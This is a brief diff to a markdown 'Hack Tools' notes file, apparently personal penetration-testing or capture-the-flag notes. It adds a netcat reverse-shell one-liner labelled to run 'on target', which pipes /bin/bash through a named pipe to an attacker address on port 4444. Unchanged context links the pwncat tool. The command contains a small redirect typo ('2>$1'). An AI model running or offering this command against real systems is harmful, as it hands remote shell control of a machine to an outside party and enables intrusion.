@@ -1,5 +1,9 @@
 # Hack Tools
-
+#### nc reverce
+on target
+```
+rm /tmp/f; mkfifo /tmp/f; nc $ip 4444 0</tmp/f | /bin/bash >/tmp/f 2>$1
+```
 #### pwncat by John Hammond
 https://github.com/calebstewart/pwncat
 
